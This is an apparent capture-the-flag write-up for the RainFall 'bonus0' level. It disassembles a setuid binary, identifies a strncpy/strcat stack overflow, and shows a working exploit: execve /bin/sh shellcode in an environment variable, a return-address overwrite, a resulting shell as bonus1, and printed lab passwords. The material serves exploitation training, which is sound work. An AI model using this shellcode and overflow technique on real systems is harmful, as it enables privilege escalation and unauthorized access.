level9@RainFall:~$ su bonus0
Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
# first step identify the target
bonus0@RainFall:~$ ls -lhtr
total 8.0K
-rwsr-s---+ 1 bonus1 users 5.5K Mar  6  2016 bonus0
bonus0@RainFall:~$ 
## detect useful strings
readelf -p .rodata bonus0
String dump of section '.rodata':
  [     8]   - 
  [     c]
-> may need a shellcode
## detect entry vectors
(gdb) info functions
0x08048380  read@plt -> read from a fd
0x08048390  strcat@plt -> buffer overflow
0x080483a0  strcpy@plt -> buffer overflow
0x080483b0  puts@plt   -> 
0x080483d0  strchr@plt -> buffer overflow if not null str
0x080483f0  strncpy@plt ->buffer overflow if not null str and n is > buff size
0x080484b4  p    -> custom fun 1
0x0804851e  pp   -> custom fun 2
0x080485a4  main -> function

## How to procede with actual info
Probably need to use a shell code in a buffer using input may stdin or argv.
look like is using strchr for search '-' char some condition in the logic of the program.
## let's execute for test
bonus0@RainFall:~$ ltrace ./bonus0
__libc_start_main(0x80485a4, 1, 0xbffffd14, 0x80485d0, 0x8048640 <unfinished ...>
puts(" - " -  -> one use of ' - " is for puts nice.
read(0, hola -> read stdin
"hola\n", 4096)                               = 5
strchr("hola\n", '\n')                                = "\n" -> search newline -> if not newline -> may return NULL but i don't think this would be the vector
strncpy(0xbffffbf8, "hola", 20)                       = 0xbffffbf8 -> copy until newline
puts(" - " - 
)                                           = 4
### No malloc then info is in the stack -> stack overflow return main function -> to shellcode ?
## No use strcat may need to input data again ?
read(0, hola
"hola\n", 4096)                               = 5 -> 4096 ## Probably the length of the buffer
strchr("hola\n", '\n')                                = "\n"
strncpy(0xbffffc0c, "hola", 20)                       = 0xbffffc0c -> why length of 20?
strcpy(0xbffffc46, "hola")                            = 0xbffffc46
strcat("hola ", "hola")                               = "hola hola"
puts("hola hola"hola hola
)                                     = 10
+++ exited (status 0) +++
## Probably add space between the first input and second.
## end on the second input.
# let's disass main
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
   0x080485a4 <+0>:	push   ebp
   0x080485a5 <+1>:	mov    ebp,esp
   0x080485a7 <+3>:	and    esp,0xfffffff0
   0x080485aa <+6>:	sub    esp,0x40 -> local vars 4 * 16 = 64 B
   0x080485ad <+9>:	lea    eax,[esp+0x16] -> 64 - (16 + 6) = 42 B of buffer or whatever
   0x080485b1 <+13>:	mov    DWORD PTR [esp],eax -> pass buffer as param to pp
   0x080485b4 <+16>:	call   0x804851e <pp> -> call pp
   0x080485b9 <+21>:	lea    eax,[esp+0x16] -> take the buffer address    
   0x080485bd <+25>:	mov    DWORD PTR [esp],eax -> pass as param to puts
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt> -> call puts
   0x080485c5 <+33>:	mov    eax,0x0 -> end of main
   0x080485ca <+38>:	leave  
   0x080485cb <+39>:	ret    
End of assembler dump.
pp
   0x0804851e <+0>:	push   ebp
   0x0804851f <+1>:	mov    ebp,esp
   0x08048521 <+3>:	push   edi
   0x08048522 <+4>:	push   ebx
   0x08048523 <+5>:	sub    esp,0x50 -> 5 * 16 = 80 B buf
   0x08048526 <+8>:	mov    DWORD PTR [esp+0x4],0x80486a0 -
   0x0804852e <+16>:	lea    eax,[ebp-0x30] -> param of p
   0x08048531 <+19>:	mov    DWORD PTR [esp],eax 
   0x08048534 <+22>:	call   0x80484b4 <p> -> call p
   0x08048539 <+27>:	mov    DWORD PTR [esp+0x4],0x80486a0
   0x08048541 <+35>:	lea    eax,[ebp-0x1c]
   0x08048544 <+38>:	mov    DWORD PTR [esp],eax
   0x08048547 <+41>:	call   0x80484b4 <p> -> call p
   0x0804854c <+46>:	lea    eax,[ebp-0x30]
   0x0804854f <+49>:	mov    DWORD PTR [esp+0x4],eax
   0x08048553 <+53>:	mov    eax,DWORD PTR [ebp+0x8] -> buffer strcpy 80 B - 8 B -> 72Bmay overflow cause 4096 size read 
   0x08048556 <+56>:	mov    DWORD PTR [esp],eax
   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt> -> strcpy
   0x0804855e <+64>:	mov    ebx,0x80486a4
   0x08048563 <+69>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048566 <+72>:	mov    DWORD PTR [ebp-0x3c],0xffffffff
   0x0804856d <+79>:	mov    edx,eax
   0x0804856f <+81>:	mov    eax,0x0
   0x08048574 <+86>:	mov    ecx,DWORD PTR [ebp-0x3c]
   0x08048577 <+89>:	mov    edi,edx
   0x08048579 <+91>:	repnz scas al,BYTE PTR es:[edi] -> strcpy
   0x0804857b <+93>:	mov    eax,ecx
   0x0804857d <+95>:	not    eax
   0x0804857f <+97>:	sub    eax,0x1                  -> end strcpy
   0x08048582 <+100>:	add    eax,DWORD PTR [ebp+0x8]
   0x08048585 <+103>:	movzx  edx,WORD PTR [ebx] 
   0x08048588 <+106>:	mov    WORD PTR [eax],dx -> put ' '
   0x0804858b <+109>:	lea    eax,[ebp-0x1c]
   0x0804858e <+112>:	mov    DWORD PTR [esp+0x4],eax strcat param2
   0x08048592 <+116>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048595 <+119>:	mov    DWORD PTR [esp],eax strcpat param1
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
   0x0804859d <+127>:	add    esp,0x50
   Dump of assembler code for function p:
   0x080484b4 <+0>:	push   ebp
   0x080484b5 <+1>:	mov    ebp,esp
   0x080484b7 <+3>:	sub    esp,0x1018 16**3 + 16 + 8= 4096 + 16 + 8 = 4096 + 24 = 4120 B
   0x080484bd <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484c0 <+12>:	mov    DWORD PTR [esp],eax
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt> -> call puts
   0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000 -> size of read 4096 B
   0x080484d0 <+28>:	lea    eax,[ebp-0x1008] -> buffer
   0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax -> buffer param read
   0x080484da <+38>:	mov    DWORD PTR [esp],0x0 -> stdin
   0x080484e1 <+45>:	call   0x8048380 <read@plt> -> read
   0x080484e6 <+50>:	mov    DWORD PTR [esp+0x4],0xa -> param strchr newline
   0x080484ee <+58>:	lea    eax,[ebp-0x1008] -> buffer
   0x080484f4 <+64>:	mov    DWORD PTR [esp],eax -> param strchr buffer
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	mov    BYTE PTR [eax],0x0 -> if null de ref null, else change \n with '\0' 
   0x080484ff <+75>:	lea    eax,[ebp-0x1008] -> eax = buffer address
   0x08048505 <+81>:	mov    DWORD PTR [esp+0x8],0x14 -> param strncpy20
   0x0804850d <+89>:	mov    DWORD PTR [esp+0x4],eax  -> param buffer address
   0x08048511 <+93>:	mov    eax,DWORD PTR [ebp+0x8] -> param dst address
   0x08048514 <+96>:	mov    DWORD PTR [esp],eax
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:	leave  
   0x0804851d <+105>:	ret    
End of assembler dump.
# logic of the program
main call pp & puts the buffer pass to pp
pp -> call p two times, strcpy first string to buffer swap '\0', ' ' -> and strcat 2 str
p -> puts, read, strchr '\n', swap first '\n', '\0', strncpy readbuf, localbuf, 20, strcpy
# logic of the exploit
strncpy()  Warning: If there is no null byte among the first n bytes of src, the string placed in dest will not be null-terminated.
we could use this to avoid the ' ' in the shellcode.
# with buffer overflow change in stack the return of a p, with the shellcode
## How to proceed
### Test the offset
#### first string of > 20
AAAAAAAAAAAAAAAAAAAA
#### pattern to get the offset https://wiremask.eu/tools/buffer-overflow-pattern-generator/
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
AAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aaôý· Aa0Aa1Aa2Aa3Aa4Aa5Aaôý· -> puts the concat of the string and look like the second appear twice ;)

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
# it says the offset is of 9 B. -> cause is write it two times maybe could be tricky
#### I need to get the buffer address to put before offset.
   0x080484d0 <+28>:	lea    eax,[ebp-0x1008] -> buffer
(gdb) b *p+28
(gdb) r
(gdb) p $ebp - 0x1008
$1 = (void *) 0xbfffeb90 -> buff addr
#### How to exploit
fill the first input with NOP '\x90'
How much
should overpass to avoid overwrite 40 B of future strcpy first param overflow + ' ' 1 B + 20 B  to avoid overwrite. should be > 61 i will use 62
then pass the shellcode. same as level9 http://shell-storm.org/shellcode/files/shellcode-827.php
python -c 'print "\x90" * 62 "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x00" * 3973'
python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"' | xxd
0000000: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000010: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000020: 9090 9090 9090 9090 9090 9090 9090 9090  ................
0000030: 9090 9090 9090 9090 9090 9090 9090 31c0  ..............1.
0000040: 5068 2f2f 7368 682f 6269 6e89 e389 c189  Ph//shh/bin.....
0000050: c2b0 0bcd 8031 c040 cd80 0a              .....1.@...
##### Warning  shouldn't overflow the buffer. buffer size 4096 B
4096 - 123
#### Second string
offset = 9
buffer_address + 61 -> nop and shellcode.
p $ebp - 0x1008 + 61
$2 = (void *) 0xbfffebcd
python -c 'print "A" * 9 + "\xcd\xeb\xff\xbf"'
python -c 'print "A" * 9 + "\xcd\xeb\xff\xbf"' + 7 * "B" | xxd
0000000: 4141 4141 4141 4141 41cd ebff bf0a       AAAAAAAAA.....
####### 
Not working cause outside the function p the value of her buffer is undefined.
i will use a shell code as env var
3973
NOP + shellcode
export CODE=`/bin/echo -ne "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"`
# let's take the pointer to the env
(gdb) x/40s *((char **)environ)
0xbfffff19:	 "CODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311Í€"
# 1 str fill with 20 random not null char
# 2 str 9 prefix + pointer to shellcode + suffix to reach 20 B
bonus0@RainFall:~$  (python -c 'print "A" * 20' ; python -c 'print "A"*9 + "\xbf\xff\xff\x19"[::-1] + "B" * 7' ; cat) | ./bonus0
 - 
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAÿÿ¿BBBBBBBôý· AAAAAAAAAÿÿ¿BBBBBBBôý·
ls
ls: cannot open directory .: Permission denied
id
uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
